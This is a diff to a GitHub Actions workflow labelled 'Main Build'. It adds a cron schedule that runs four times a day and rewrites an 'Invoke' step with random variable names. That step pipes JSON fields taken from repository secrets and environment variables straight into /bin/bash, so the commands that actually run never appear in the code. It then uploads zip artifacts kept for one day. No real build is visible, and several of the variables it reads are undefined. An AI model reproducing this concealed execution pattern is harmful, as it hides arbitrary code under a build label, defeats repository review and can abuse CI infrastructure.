@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '11 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,16 +16,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          vou98546: ${{ secrets.vou98546 }}
+          kxa22602: ${{ secrets.kxa22602 }}
         run: |
-          printf '%s' "$vou98546" | jq -r .vovz81533 | /bin/bash
-          printf '%s' "$akwls70472" | jq -r .k4725 | /bin/bash
-          printf '%s' "$idu48694" | jq -r .nkdx7 | /bin/bash
-          printf '%s' "$s265" | jq -r .xjuzb85 | /bin/bash
+          printf '%s' "$kxa22602" | jq -r .tryjl5787 | /bin/bash
+          printf '%s' "$wqze1777" | jq -r .phykp68 | /bin/bash
+          echo $ut7 | jq -r .ybubw6727 | /bin/bash
+          echo $ej76 | jq -r .b3 | /bin/bash
+          echo $x6538 | jq -r .s8 | /bin/bash
+          printf '%s' "$tc92405" | jq -r .nfe3028 | /bin/bash
+          printf '%s' "$uto9" | jq -r .f61 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: CyVXh1Q4
+          name: xauvNNti
           path: "*.zip"
           retention-days: 1
